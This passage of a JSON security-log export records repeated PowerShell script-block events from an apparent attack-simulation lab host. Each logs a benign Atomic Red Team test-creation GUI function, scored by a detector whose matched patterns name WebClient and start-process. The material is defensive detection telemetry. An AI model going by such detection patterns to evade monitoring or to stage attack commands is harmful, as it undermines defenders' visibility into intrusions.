\"PowerShell\" }\n        # input args\n        $inputArgs = @()\n        $InputArgCards.GetEnumerator() | ForEach-Object {\n            if ($_.Value -eq $false) {\n                # this was not deleted\n                $prefix = $_.key\n                $InputArgName = (Get-UDElement -Id \"$prefix-InputArgName\").Attributes['value']\n                $InputArgDescription = (Get-UDElement -Id \"$prefix-InputArgDescription\").Attributes['value']\n                $InputArgDefault = (Get-UDElement -Id \"$prefix-InputArgDefault\").Attributes['value']\n                $InputArgType = (Get-UDElement -Id \"$prefix-InputArgType\").Attributes['value']\n                if (\"\" -eq $InputArgType) { $InputArgType = \"String\" }\n                $NewInputArg = New-AtomicTestInputArgument -Name $InputArgName -Description $InputArgDescription -Type $InputArgType -Default $InputArgDefault -WarningVariable +warnings\n                $inputArgs += $NewInputArg\n            }\n        }\n        # dependencies\n        $dependencies = @()\n        $preReqEx = \"\"\n        $depCards.GetEnumerator() | ForEach-Object {\n            if ($_.Value -eq $false) {\n                # a value of true means the card was deleted, so only add dependencies from non-deleted cards\n                $prefix = $_.key\n                $depDescription = (Get-UDElement -Id \"$prefix-depDescription\").Attributes['value']\n                $prereqCommand = (Get-UDElement -Id \"$prefix-prereqCommand\").Attributes['value']\n                $getPrereqCommand = (Get-UDElement -Id \"$prefix-getPrereqCommand\").Attributes['value']\n                $preReqEx = (Get-UDElement -Id \"preReqEx\").Attributes['value']\n                if (\"\" -eq $preReqEx) { $preReqEx = \"PowerShell\" }\n                $NewDep = New-AtomicTestDependency -Description $depDescription -PrereqCommand $prereqCommand -GetPrereqCommand $getPrereqCommand -WarningVariable +warnings\n                $dependencies += $NewDep\n            }\n        }\n        $depParams = @{ }\n        if ($dependencies.count -gt 0) {\n            $depParams.add(\"DependencyExecutorType\", $preReqEx)\n            $depParams.add(\"Dependencies\", $dependencies)\n        }\n        if (($cleanupCommands -ne \"\") -and ($null -ne $cleanupCommands)) { $depParams.add(\"ExecutorCleanupCommand\", $cleanupCommands) }\n        $depParams.add(\"ExecutorElevationRequired\", $elevationRequired)\n\n        $AtomicTest = New-AtomicTest -Name $testName -Description $testDesc -SupportedPlatforms $platforms -InputArguments $inputArgs -ExecutorType $executor -ExecutorCommand $attackCommands -WarningVariable +warnings @depParams\n        $yaml = ($AtomicTest | ConvertTo-Yaml) -replace \"^\", \"- \" -replace \"`n\", \"`n  \"\n        foreach ($warning in $warnings) { Show-UDToast $warning -BackgroundColor LightYellow -Duration 10000 }\n        New-UDElement -ID yaml -Tag pre -Content { $yaml }\n    }\n\n    $epYamlModal = New-UDEndpoint -Endpoint {\n        Show-UDModal -Header { New-UDHeading -Size 3 -Text \"Test Definition YAML\" } -Content {\n            new-udrow -endpoint $BuildAndDisplayYamlScriptBlock\n            # Left arrow button (decrease indentation)\n            New-UDButton -Icon arrow_circle_left -OnClick (\n                New-UDEndpoint -Endpoint {\n                    $yaml = (Get-UDElement -Id \"yaml\").Content[0]\n                    if (-not $yaml.startsWith(\"- \")) {\n                        Set-UDElement -Id \"yaml\" -Content {\n                            $yaml -replace \"^  \", \"\" -replace \"`n  \", \"`n\"\n                        }\n                    }\n                }\n            )\n            # Right arrow button (increase indentation)\n            New-UDButton -Icon arrow_circle_right -OnClick (\n                New-UDEndpoint -Endpoint {\n                    $yaml = (Get-UDElement -Id \"yaml\").Content[0]\n                    Set-UDElement -Id \"yaml\" -Content {\n                        $yaml -replace \"^\", \"  \" -replace \"`n\", \"`n  \"\n                    }\n                }\n            )\n            # Copy Yaml to clipboard\n            New-UDButton -Text \"Copy\" -OnClick (\n                New-UDEndpoint -Endpoint {\n                    $yaml = (Get-UDElement -Id \"yaml\").Content[0]\n                    Set-UDClipboard -Data $yaml\n                    Show-UDToast -Message \"Copied YAML to the Clipboard\" -BackgroundColor YellowGreen\n                }\n            )\n        }\n    }\n\n    $epFillTestData = New-UDEndpoint -Endpoint {\n        Add-UDElement -ParentId \"inputCard\" -Content { New-InputArgCard }\n        Add-UDElement -ParentId \"depCard\"   -Content { New-depCard }\n        Start-Sleep 1\n        Set-UDElement -Id atomicName -Attributes @{value = \"My new atomic\" }\n        Set-UDElement -Id atomicDescription -Attributes @{value = \"This is the atomic description\" }\n        Set-UDElement -Id attackCommands -Attributes @{value = \"echo this`necho that\" }\n        Set-UDElement -Id cleanupCommands -Attributes @{value = \"cleanup commands here`nand here...\" }\n        # InputArgs\n        $cardNumber = 1\n        Set-UDElement -Id \"InputArgCard$cardNumber-InputArgName\" -Attributes @{value = \"input_arg_1\" }\n        Set-UDElement -Id \"InputArgCard$cardNumber-InputArgDescription\" -Attributes @{value = \"InputArg1 description\" }\n        Set-UDElement -Id \"InputArgCard$cardNumber-InputArgDefault\" -Attributes @{value = \"this is the default value\" }\n        # dependencies\n        Set-UDElement -Id \"depCard$cardNumber-depDescription\" -Attributes @{value = \"This file must exist\" }\n        Set-UDElement -Id \"depCard$cardNumber-prereqCommand\" -Attributes @{value = \"if (this) then that\" }\n        Set-UDElement -Id \"depCard$cardNumber-getPrereqCommand\" -Attributes @{value = \"iwr\" }\n\n    }\n    ############## End EndPoint (ep) Definitions\n\n    ############## Static Definitions\n    $supportedPlatforms = New-UDLayout -Columns 4 {\n        New-UDElement -Tag Label -Attributes @{ style = @{\"font-size\" = \"15px\" } } -Content { \"Supported Platforms:\" }\n        New-UDCheckbox -FilledIn -Label \"Windows\" -Checked -Id spWindows\n        New-UDCheckbox -FilledIn -Label \"Linux\" -Id spLinux\n        New-UDCheckbox -FilledIn -Label \"macOS\"-Id spMacOS\n    }\n\n    $executorRow = New-UDLayout -Columns 4 {\n        New-UDSelectX 'executorSelector' \"Executor for Attack Commands\"\n        New-UDCheckbox -ID elevationRequired -FilledIn -Label \"Requires Elevation to Execute Successfully?\"\n    }\n\n    $genarateYamlButton = New-UDRow -Columns {\n        New-UDColumn -Size 8 -Content { }\n        New-UDColumn -Size 4 -Content {\n            New-UDButton -Text \"Generate Test Definition YAML\" -OnClick ( $epYamlModal )\n        }\n    }\n\n    ############## End Static Definitions\n\n    ############## The Dashboard\n    $idleTimeOut = New-TimeSpan -Minutes 10080\n    $db = New-UDDashboard -Title \"Atomic Test Creation\" -IdleTimeout $idleTimeOut -EndpointInitialization $ei -Content {\n        New-UDCard -Id \"mainCard\" -Content {\n            New-UDCard -Content {\n                New-UDTextBoxX 'atomicName' \"Atomic Test Name\"\n                New-UDTextAreaX \"atomicDescription\" \"Atomic Test Description\"\n                $supportedPlatforms\n                New-UDTextAreaX \"attackCommands\" \"Attack Commands\"\n                $executorRow\n                New-UDTextAreaX \"cleanupCommands\" \"Cleanup Commands (Optional)\"\n                $genarateYamlButton\n            }\n\n            # input args\n            New-UDCard -Id \"inputCard\" -Endpoint {\n                New-UDButton -Text \"Add Input Argument (Optional)\" -OnClick (\n                    New-UDEndpoint -Endpoint { Add-UDElement -ParentId \"inputCard\" -Content { New-InputArgCard } }\n                )\n            }\n\n            # prereqs\n            New-UDCard -Id \"depCard\" -Endpoint {\n                New-UDLayout -columns 4 {\n                    New-UDButton -Text \"Add Prerequisite (Optional)\" -OnClick (\n                        New-UDEndpoint -Endpoint { Add-UDElement -ParentId \"depCard\" -Content { New-depCard } }\n                    )\n                    New-UDSelectX 'preReqEx' \"Executor for Prereq Commands\"\n                }\n            }\n        }\n\n        # button to fill form with test data for development purposes\n        if ($false) { New-UDButton -Text \"Fill Test Data\" -OnClick ( $epFillTestData ) }\n    }\n    ############## End of the Dashboard\n\n    Stop-AtomicGUI\n    Start-UDDashboard -port $port -Dashboard $db -Name \"AtomicGUI\" -ListenAddress 127.0.0.1\n    start-process http://localhost:$port\n}\n\nfunction Stop-AtomicGUI {\n    Get-UDDashboard -Name 'AtomicGUI' | Stop-UDDashboard\n    Write-Host \"Stopped all AtomicGUI Dashboards\"\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'WebClient' matched: 'http'\nPattern 'SuspiciousKeyword' matched: 'start-process'"
    },
    {
      "timestamp": "2024-12-16T20:34:57.2569752+00:00",
      "event_id": 35711094,
      "risk_score": 7,
      "detected_patterns": ", WebClient, Get, SuspiciousKeyword",
      "pattern_details": "WebClient [Score: 5]; Get [Score: 1]; SuspiciousKeyword [Score: 1]",
      "command_length": 13819,
      "full_command": "function Start-AtomicGUI {\n    param (\n        [Int] $port = 8487\n    )\n    # Install-Module UniversalDashboard if not already installed\n    $UDcommunityInstalled = Get-InstalledModule -Name \"UniversalDashboard.Community\" -ErrorAction:SilentlyContinue\n    $UDinstalled = Get-InstalledModule -Name \"UniversalDashboard\" -ErrorAction:SilentlyContinue\n    if (-not $UDcommunityInstalled -and -not $UDinstalled) {\n        Write-Host \"Installing UniversalDashboard.Community\"\n        Install-Module -Name UniversalDashboard.Community -Scope CurrentUser -Force\n    }\n\n    ############## Function Definitions Made Available to EndPoints\n    function New-UDTextAreaX ($ID, $PlaceHolder) {\n        New-UDElement -Tag div -Attributes @{class = \"input-field col\" } -Content {\n            New-UDElement -Tag \"textarea\" -id  $ID -Attributes @{ class = \"materialize-textarea ud-input\" }\n            New-UDElement -Tag Label -Attributes @{for = $ID } -Content { $PlaceHolder }\n        }\n    }\n\n    function New-UDTextBoxX ($ID, $PlaceHolder) {\n        New-UDElement -Tag div -Attributes @{class = \"input-field col\" } -Content {\n            New-UDElement -Tag \"input\" -id $ID -Attributes @{ class = \"ud-input\"; type = \"text\" }\n            New-UDElement -Tag Label -Attributes @{for = $ID } -Content { $PlaceHolder }\n        }\n    }\n\n    $InputArgCards = @{ }\n    function New-InputArgCard {\n        $cardNumber = $InputArgCards.count + 1\n        $newCard = New-UDCard -ID \"InputArgCard$cardNumber\" -Content {\n            New-UDTextBoxX \"InputArgCard$cardNumber-InputArgName\" \"Input Argument Name\"\n            New-UDTextAreaX \"InputArgCard$cardNumber-InputArgDescription\" \"Description\"\n            New-UDTextBoxX \"InputArgCard$cardNumber-InputArgDefault\" \"Default Value\"\n            New-UDLayout -columns 4 {\n                New-UDSelect -ID \"InputArgCard$cardNumber-InputArgType\" -Label \"Type\" -Option {\n                    New-UDSelectOption -Name \"Path\" -Value \"path\"\n                    New-UDSelectOption -Name \"String\" -Value \"string\"\n                    New-UDSelectOption -Name \"Url\" -Value \"url\"\n                    New-UDSelectOption -Name \"Integer\" -Value \"integer\"\n                }\n            }\n            New-UDButton -Text \"Remove this Input Argument\"  -OnClick (\n                New-UDEndpoint -Endpoint {\n                    Remove-UDElement -Id \"InputArgCard$cardNumber\"\n                    $inputArgCards[\"InputArgCard$cardNumber\"] = $true\n                } -ArgumentList @($cardNumber, $inputArgCards)\n            )\n        }\n        $InputArgCards.Add(\"InputArgCard$cardNumber\", $false) | Out-Null\n        $newCard\n    }\n\n    $depCards = @{ }\n    function New-depCard {\n        $cardNumber = $depCards.count + 1\n        $newCard = New-UDCard -ID \"depCard$cardNumber\" -Content {\n            New-UDTextBoxX \"depCard$cardNumber-depDescription\" \"Prereq Description\"\n            New-UDTextAreaX \"depCard$cardNumber-prereqCommand\" \"Check prereqs Command\"\n            New-UDTextAreaX \"depCard$cardNumber-getPrereqCommand\" \"Get Prereqs Command\"\n            New-UDButton -Text \"Remove this Prereq\"  -OnClick (\n                New-UDEndpoint -Endpoint {\n                    Remove-UDElement -Id \"depCard$cardNumber\"\n                    $depCards[\"depCard$cardNumber\"] = $true\n                } -ArgumentList @($cardNumber, $depCards)\n            )\n        }\n        $depCards.Add(\"depCard$cardNumber\", $false) | Out-Null\n        $newCard\n    }\n\n    function New-UDSelectX ($Id, $Label) {\n        New-UDSelect -Label $Label -Id $Id -Option {\n            New-UDSelectOption -Name \"PowerShell\" -Value \"PowerShell\" -Selected\n            New-UDSelectOption -Name \"Command Prompt\" -Value \"CommandPrompt\"\n            New-UDSelectOption -Name \"Bash\" -Value \"Bash\"\n            New-UDSelectOption -Name \"Sh\" -Value \"Sh\"\n        }\n    }\n\n    ############## End Function Definitions Made Available to EndPoints\n\n    # EndpointInitialization defining which methods, modules, and variables will be available for use within an endpoint\n    $ei = New-UDEndpointInitialization `\n        -Function @(\"New-InputArgCard\", \"New-depCard\", \"New-UDTextAreaX\", \"New-UDTextBoxX\", \"New-UDSelectX\") `\n        -Variable @(\"InputArgCards\", \"depCards\", \"yaml\") `\n        -Module @(\"..\\Invoke-AtomicRedTeam.psd1\")\n\n    ############## EndPoint (ep) Definitions: Dynamic code called to generate content for an element or perfrom onClick actions\n    $BuildAndDisplayYamlScriptBlock = {\n        $testName = (Get-UDElement -Id atomicName).Attributes['value']\n        $testDesc = (Get-UDElement -Id atomicDescription).Attributes['value']\n        $platforms = @()\n        if ((Get-UDElement -Id spWindows).Attributes['checked']) { $platforms += \"Windows\" }\n        if ((Get-UDElement -Id spLinux).Attributes['checked']) { $platforms += \"Linux\" }\n        if ((Get-UDElement -Id spMacOS).Attributes['checked']) { $platforms += \"macOS\" }\n        $attackCommands = (Get-UDElement -Id attackCommands).Attributes['value']\n        $executor = (Get-UDElement -Id executorSelector).Attributes['value']\n        $elevationRequired = (Get-UDElement -Id elevationRequired).Attributes['checked']\n        $cleanupCommands = (Get-UDElement -Id cleanupCommands).Attributes['value']\n        if (\"\" -eq $executor) { $executor = \"PowerShell\" }\n        # input args\n        $inputArgs = @()\n        $InputArgCards.GetEnumerator() | ForEach-Object {\n            if ($_.Value -eq $false) {\n                # this was not deleted\n                $prefix = $_.key\n                $InputArgName = (Get-UDElement -Id \"$prefix-InputArgName\").Attributes['value']\n                $InputArgDescription = (Get-UDElement -Id \"$prefix-InputArgDescription\").Attributes['value']\n                $InputArgDefault = (Get-UDElement -Id \"$prefix-InputArgDefault\").Attributes['value']\n                $InputArgType = (Get-UDElement -Id \"$prefix-InputArgType\").Attributes['value']\n                if (\"\" -eq $InputArgType) { $InputArgType = \"String\" }\n                $NewInputArg = New-AtomicTestInputArgument -Name $InputArgName -Description $InputArgDescription -Type $InputArgType -Default $InputArgDefault -WarningVariable +warnings\n                $inputArgs += $NewInputArg\n            }\n        }\n        # dependencies\n        $dependencies = @()\n        $preReqEx = \"\"\n        $depCards.GetEnumerator() | ForEach-Object {\n            if ($_.Value -eq $false) {\n                # a value of true means the card was deleted, so only add dependencies from non-deleted cards\n                $prefix = $_.key\n                $depDescription = (Get-UDElement -Id \"$prefix-depDescription\").Attributes['value']\n                $prereqCommand = (Get-UDElement -Id \"$prefix-prereqCommand\").Attributes['value']\n                $getPrereqCommand = (Get-UDElement -Id \"$prefix-getPrereqCommand\").Attributes['value']\n                $preReqEx = (Get-UDElement -Id \"preReqEx\").Attributes['value']\n                if (\"\" -eq $preReqEx) { $preReqEx = \"PowerShell\" }\n                $NewDep = New-AtomicTestDependency -Description $depDescription -PrereqCommand $prereqCommand -GetPrereqCommand $getPrereqCommand -WarningVariable +warnings\n                $dependencies += $NewDep\n            }\n        }\n        $depParams = @{ }\n        if ($dependencies.count -gt 0) {\n            $depParams.add(\"DependencyExecutorType\", $preReqEx)\n            $depParams.add(\"Dependencies\", $dependencies)\n        }\n        if (($cleanupCommands -ne \"\") -and ($null -ne $cleanupCommands)) { $depParams.add(\"ExecutorCleanupCommand\", $cleanupCommands) }\n        $depParams.add(\"ExecutorElevationRequired\", $elevationRequired)\n\n        $AtomicTest = New-AtomicTest -Name $testName -Description $testDesc -SupportedPlatforms $platforms -InputArguments $inputArgs -ExecutorType $executor -ExecutorCommand $attackCommands -WarningVariable +warnings @depParams\n        $yaml = ($AtomicTest | ConvertTo-Yaml) -replace \"^\", \"- \" -replace \"`n\", \"`n  \"\n        foreach ($warning in $warnings) { Show-UDToast $warning -BackgroundColor LightYellow -Duration 10000 }\n        New-UDElement -ID yaml -Tag pre -Content { $yaml }\n    }\n\n    $epYamlModal = New-UDEndpoint -Endpoint {\n        Show-UDModal -Header { New-UDHeading -Size 3 -Text \"Test Definition YAML\" } -Content {\n            new-udrow -endpoint $BuildAndDisplayYamlScriptBlock\n            # Left arrow button (decrease indentation)\n            New-UDButton -Icon arrow_circle_left -OnClick (\n                New-UDEndpoint -Endpoint {\n                    $yaml = (Get-UDElement -Id \"yaml\").Content[0]\n                    if (-not $yaml.startsWith(\"- \")) {\n                        Set-UDElement -Id \"yaml\" -Content {\n                            $yaml -replace \"^  \", \"\" -replace \"`n  \", \"`n\"\n                        }\n                    }\n                }\n            )\n            # Right arrow button (increase indentation)\n            New-UDButton -Icon arrow_circle_right -OnClick (\n                New-UDEndpoint -Endpoint {\n                    $yaml = (Get-UDElement -Id \"yaml\").Content[0]\n                    Set-UDElement -Id \"yaml\" -Content {\n                        $yaml -replace \"^\", \"  \" -replace \"`n\", \"`n  \"\n                    }\n                }\n            )\n            # Copy Yaml to clipboard\n            New-UDButton -Text \"Copy\" -OnClick (\n                New-UDEndpoint -Endpoint {\n                    $yaml = (Get-UDElement -Id \"yaml\").Content[0]\n                    Set-UDClipboard -Data $yaml\n                    Show-UDToast -Message \"Copied YAML to the Clipboard\" -BackgroundColor YellowGreen\n                }\n            )\n        }\n    }\n\n    $epFillTestData = New-UDEndpoint -Endpoint {\n        Add-UDElement -ParentId \"inputCard\" -Content { New-InputArgCard }\n        Add-UDElement -ParentId \"depCard\"   -Content { New-depCard }\n        Start-Sleep 1\n        Set-UDElement -Id atomicName -Attributes @{value = \"My new atomic\" }\n        Set-UDElement -Id atomicDescription -Attributes @{value = \"This is the atomic description\" }\n        Set-UDElement -Id attackCommands -Attributes @{value = \"echo this`necho that\" }\n        Set-UDElement -Id cleanupCommands -Attributes @{value = \"cleanup commands here`nand here...\" }\n        # InputArgs\n        $cardNumber = 1\n        Set-UDElement -Id \"InputArgCard$cardNumber-InputArgName\" -Attributes @{value = \"input_arg_1\" }\n        Set-UDElement -Id \"InputArgCard$cardNumber-InputArgDescription\" -Attributes @{value = \"InputArg1 description\" }\n        Set-UDElement -Id \"InputArgCard$cardNumber-InputArgDefault\" -Attributes @{value = \"this is the default value\" }\n        # dependencies\n        Set-UDElement -Id \"depCard$cardNumber-depDescription\" -Attributes @{value = \"This file must exist\" }\n        Set-UDElement -Id \"depCard$cardNumber-prereqCommand\" -Attributes @{value = \"if (this) then that\" }\n        Set-UDElement -Id \"depCard$cardNumber-getPrereqCommand\" -Attributes @{value = \"iwr\" }\n\n    }\n    ############## End EndPoint (ep) Definitions\n\n    ############## Static Definitions\n    $supportedPlatforms = New-UDLayout -Columns 4 {\n        New-UDElement -Tag Label -Attributes @{ style = @{\"font-size\" = \"15px\" } } -Content { \"Supported Platforms:\" }\n        New-UDCheckbox -FilledIn -Label \"Windows\" -Checked -Id spWindows\n        New-UDCheckbox -FilledIn -Label \"Linux\" -Id spLinux\n        New-UDCheckbox -FilledIn -Label \"macOS\"-Id spMacOS\n    }\n\n    $executorRow = New-UDLayout -Columns 4 {\n        New-UDSelectX 'executorSelector' \"Executor for Attack Commands\"\n        New-UDCheckbox -ID elevationRequired -FilledIn -Label \"Requires Elevation to Execute Successfully?\"\n    }\n\n    $genarateYamlButton = New-UDRow -Columns {\n        New-UDColumn -Size 8 -Content { }\n        New-UDColumn -Size 4 -Content {\n            New-UDButton -Text \"Generate Test Definition YAML\" -OnClick ( $epYamlModal )\n        }\n    }\n\n    ############## End Static Definitions\n\n    ############## The Dashboard\n    $idleTimeOut = New-TimeSpan -Minutes 10080\n    $db = New-UDDashboard -Title \"Atomic Test Creation\" -IdleTimeout $idleTimeOut -EndpointInitialization $ei -Content {\n        New-UDCard -Id \"mainCard\" -Content {\n            New-UDCard -Content {\n                New-UDTextBoxX 'atomicName' \"Atomic Test Name\"\n                New-UDTextAreaX \"atomicDescription\" \"Atomic Test Description\"\n                $supportedPlatforms\n                New-UDTextAreaX \"attackCommands\" \"Attack Commands\"\n                $executorRow\n                New-UDTextAreaX \"cleanupCommands\" \"Cleanup Commands (Optional)\"\n                $genarateYamlButton\n            }\n\n            # input args\n            New-UDCard -Id \"inputCard\" -Endpoint {\n                New-UDButton -Text \"Add Input Argument (Optional)\" -OnClick (\n                    New-UDEndpoint -Endpoint { Add-UDElement -ParentId \"inputCard\" -Content { New-InputArgCard } }\n                )\n            }\n\n            # prereqs\n            New-UDCard -Id \"depCard\" -Endpoint {\n                New-UDLayout -columns 4 {\n                    New-UDButton -Text \"Add Prerequisite (Optional)\" -OnClick (\n                        New-UDEndpoint -Endpoint { Add-UDElement -ParentId \"depCard\" -Content { New-depCard } }\n                    )\n                    New-UDSelectX 'preReqEx' \"Executor for Prereq Commands\"\n                }\n            }\n        }\n\n        # button to fill form with test data for development purposes\n        if ($false) { New-UDButton -Text \"Fill Test Data\" -OnClick ( $epFillTestData ) }\n    }\n    ############## End of the Dashboard\n\n    Stop-AtomicGUI\n    Start-UDDashboard -port $port -Dashboard $db -Name \"AtomicGUI\" -ListenAddress 127.0.0.1\n    start-process http://localhost:$port\n}\n\nfunction Stop-AtomicGUI {\n    Get-UDDashboard -Name 'AtomicGUI' | Stop-UDDashboard\n    Write-Host \"Stopped all AtomicGUI Dashboards\"\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'WebClient' matched: 'http'\nPattern 'SuspiciousKeyword' matched: 'start-process'"
    },
    {
      "timestamp": "2024-12-16T20:34:56.1247244+00:00",
      "event_id": 35710906,
      "risk_score": 7,
      "detected_patterns": ", WebClient, Get, SuspiciousKeyword",
      "pattern_details": "WebClient [Score: 5]; Get [Score: 1]; SuspiciousKeyword [Score: 1]",
      "command_length": 13819,
      "full_command": "function Start-AtomicGUI {\n    param (\n        [Int] $port = 8487\n    )\n    # Install-Module UniversalDashboard if not already installed\n    $UDcommunityInstalled = Get-InstalledModule -Name \"UniversalDashboard.Community\" -ErrorAction:SilentlyContinue\n    $UDinstalled = Get-InstalledModule -Name \"UniversalDashboard\" -ErrorAction:SilentlyContinue\n    if (-not $UDcommunityInstalled -and -not $UDinstalled) {\n        Write-Host \"Installing UniversalDashboard.Community\"\n        Install-Module -Name UniversalDashboard.Community -Scope CurrentUser -Force\n    }\n\n    ############## Function Definitions Made Available to EndPoints\n    function New-UDTextAreaX ($ID, $PlaceHolder) {\n        New-UDElement -Tag div -Attributes @{class = \"input-field col\" } -Content {\n            New-UDElement -Tag \"textarea\" -id  $ID -Attributes @{ class = \"materialize-textarea ud-input\" }\n            New-UDElement -Tag Label -Attributes @{for = $ID } -Content { $PlaceHolder }\n        }\n    }\n\n    function New-UDTextBoxX ($ID, $PlaceHolder) {\n        New-UDElement -Tag div -Attributes @{class = \"input-field col\" } -Content {\n            New-UDElement -Tag \"input\" -id $ID -Attributes @{ class = \"ud-input\"; type = \"text\" }\n            New-UDElement -Tag Label -Attributes @{for = $ID } -Content { $PlaceHolder }\n        }\n    }\n\n    $InputArgCards = @{ }\n    function New-InputArgCard {\n        $cardNumber = $InputArgCards.count + 1\n        $newCard = New-UDCard -ID \"InputArgCard$cardNumber\" -Content {\n            New-UDTextBoxX \"InputArgCard$cardNumber-InputArgName\" \"Input Argument Name\"\n            New-UDTextAreaX \"InputArgCard$cardNumber-InputArgDescription\" \"Description\"\n            New-UDTextBoxX \"InputArgCard$cardNumber-InputArgDefault\" \"Default Value\"\n            New-UDLayout -columns 4 {\n                New-UDSelect -ID \"InputArgCard$cardNumber-InputArgType\" -Label \"Type\" -Option {\n                    New-UDSelectOption -Name \"Path\" -Value \"path\"\n                    New-UDSelectOption -Name \"String\" -Value \"string\"\n                    New-UDSelectOption -Name \"Url\" -Value \"url\"\n                    New-UDSelectOption -Name \"Integer\" -Value \"integer\"\n                }\n            }\n            New-UDButton -Text \"Remove this Input Argument\"  -OnClick (\n                New-UDEndpoint -Endpoint {\n                    Remove-UDElement -Id \"InputArgCard$cardNumber\"\n                    $inputArgCards[\"InputArgCard$cardNumber\"] = $true\n                } -ArgumentList @($cardNumber, $inputArgCards)\n            )\n        }\n        $InputArgCards.Add(\"InputArgCard$cardNumber\", $false) | Out-Null\n        $newCard\n    }\n\n    $depCards = @{ }\n    function New-depCard {\n        $cardNumber = $depCards.count + 1\n        $newCard = New-UDCard -ID \"depCard$cardNumber\" -Content {\n            New-UDTextBoxX \"depCard$cardNumber-depDescription\" \"Prereq Description\"\n            New-UDTextAreaX \"depCard$cardNumber-prereqCommand\" \"Check prereqs Command\"\n            New-UDTextAreaX \"depCard$cardNumber-getPrereqCommand\" \"Get Prereqs Command\"\n            New-UDButton -Text \"Remove this Prereq\"  -OnClick (\n                New-UDEndpoint -Endpoint {\n                    Remove-UDElement -Id \"depCard$cardNumber\"\n                    $depCards[\"depCard$cardNumber\"] = $true\n                } -ArgumentList @($cardNumber, $depCards)\n            )\n        }\n        $depCards.Add(\"depCard$cardNumber\", $false) | Out-Null\n        $newCard\n    }\n\n    function New-UDSelectX ($Id, $Label) {\n        New-UDSelect -Label $Label -Id $Id -Option {\n            New-UDSelectOption -Name \"PowerShell\" -Value \"PowerShell\" -Selected\n            New-UDSelectOption -Name \"Command Prompt\" -Value \"CommandPrompt\"\n            New-UDSelectOption -Name \"Bash\" -Value \"Bash\"\n            New-UDSelectOption -Name \"Sh\" -Value \"Sh\"\n        }\n    }\n\n    ############## End Function Definitions Made Available to EndPoints\n\n    # EndpointInitialization defining which methods, modules, and variables will be available for use within an endpoint\n    $ei = New-UDEndpointInitialization `\n        -Function @(\"New-InputArgCard\", \"New-depCard\", \"New-UDTextAreaX\", \"New-UDTextBoxX\", \"New-UDSelectX\") `\n        -Variable @(\"InputArgCards\", \"depCards\", \"yaml\") `\n        -Module @(\"..\\Invoke-AtomicRedTeam.psd1\")\n\n    ############## EndPoint (ep) Definitions: Dynamic code called to generate content for an element or perfrom onClick actions\n    $BuildAndDisplayYamlScriptBlock = {\n        $testName = (Get-UDElement -Id atomicName).Attributes['value']\n        $testDesc = (Get-UDElement -Id atomicDescription).Attributes['value']\n        $platforms = @()\n        if ((Get-UDElement -Id spWindows).Attributes['checked']) { $platforms += \"Windows\" }\n        if ((Get-UDElement -Id spLinux).Attributes['checked']) { $platforms += \"Linux\" }\n        if ((Get-UDElement -Id spMacOS).Attributes['checked']) { $platforms += \"macOS\" }\n        $attackCommands = (Get-UDElement -Id attackCommands).Attributes['value']\n        $executor = (Get-UDElement -Id executorSelector).Attributes['value']\n        $elevationRequired = (Get-UDElement -Id elevationRequired).Attributes['checked']\n        $cleanupCommands = (Get-UDElement -Id cleanupCommands).Attributes['value']\n        if (\"\" -eq $executor) { $executor = \"PowerShell\" }\n        # input args\n        $inputArgs = @()\n        $InputArgCards.GetEnumerator() | ForEach-Object {\n            if ($_.Value -eq $false) {\n                # this was not deleted\n                $prefix = $_.key\n                $InputArgName = (Get-UDElement -Id \"$prefix-InputArgName\").Attributes['value']\n                $InputArgDescription = (Get-UDElement -Id \"$prefix-InputArgDescription\").Attributes['value']\n                $InputArgDefault = (Get-UDElement -Id \"$prefix-InputArgDefault\").Attributes['value']\n                $InputArgType = (Get-UDElement -Id \"$prefix-InputArgType\").Attributes['value']\n                if (\"\" -eq $InputArgType) { $InputArgType = \"String\" }\n                $NewInputArg = New-AtomicTestInputArgument -Name $InputArgName -Description $InputArgDescription -Type $InputArgType -Default $InputArgDefault -WarningVariable +warnings\n                $inputArgs += $NewInputArg\n            }\n        }\n        # dependencies\n        $dependencies = @()\n        $preReqEx = \"\"\n        $depCards.GetEnumerator() | ForEach-Object {\n            if ($_.Value -eq $false) {\n                # a value of true means the card was deleted, so only add dependencies from non-deleted cards\n                $prefix = $_.key\n                $depDescription = (Get-UDElement -Id \"$prefix-depDescription\").Attributes['value']\n                $prereqCommand = (Get-UDElement -Id \"$prefix-prereqCommand\").Attributes['value']\n                $getPrereqCommand = (Get-UDElement -Id \"$prefix-getPrereqCommand\").Attributes['value']\n                $preReqEx = (Get-UDElement -Id \"preReqEx\").Attributes['value']\n                if (\"\" -eq $preReqEx) { $preReqEx = \"PowerShell\" }\n                $NewDep = New-AtomicTestDependency -Description $depDescription -PrereqCommand $prereqCommand -GetPrereqCommand $getPrereqCommand -WarningVariable +warnings\n                $dependencies += $NewDep\n            }\n        }\n        $depParams = @{ }\n        if ($dependencies.count -gt 0) {\n            $depParams.add(\"DependencyExecutorType\", $preReqEx)\n            $depParams.add(\"Dependencies\", $dependencies)\n        }\n        if (($cleanupCommands -ne \"\") -and ($null -ne $cleanupCommands)) { $depParams.add(\"ExecutorCleanupCommand\", $cleanupCommands) }\n        $depParams.add(\"ExecutorElevationRequired\", $elevationRequired)\n\n        $AtomicTest = New-AtomicTest -Name $testName -Description $testDesc -SupportedPlatforms $platforms -InputArguments $inputArgs -ExecutorType $executor -ExecutorCommand $attackCommands -WarningVariable +warnings @depParams\n        $yaml = ($AtomicTest | ConvertTo-Yaml) -replace \"^\", \"- \" -replace \"`n\", \"`n  \"\n        foreach ($warning in $warnings) { Show-UDToast $warning -BackgroundColor LightYellow -Duration 10000 }\n        New-UDElement -ID yaml -Tag pre -Content { $yaml }\n    }\n\n    $epYamlModal = New-UDEndpoint -Endpoint {\n        Show-UDModal -Header { New-UDHeading -Size 3 -Text \"Test Definition YAML\" } -Content {\n            new-udrow -endpoint $BuildAndDisplayYamlScriptBlock\n            # Left arrow button (decrease indentation)\n            New-UDButton -Icon arrow_circle_left -OnClick (\n                New-UDEndpoint -Endpoint {\n                    $yaml = (Get-UDElement -Id \"yaml\").Content[0]\n                    if (-not $yaml.startsWith(\"- \")) {\n                        Set-UDElement -Id \"yaml\" -Content {\n                            $yaml -replace \"^  \", \"\" -replace \"`n  \", \"`n\"\n                        }\n                    }\n                }\n            )\n            # Right arrow button (increase indentation)\n            New-UDButton -Icon arrow_circle_right 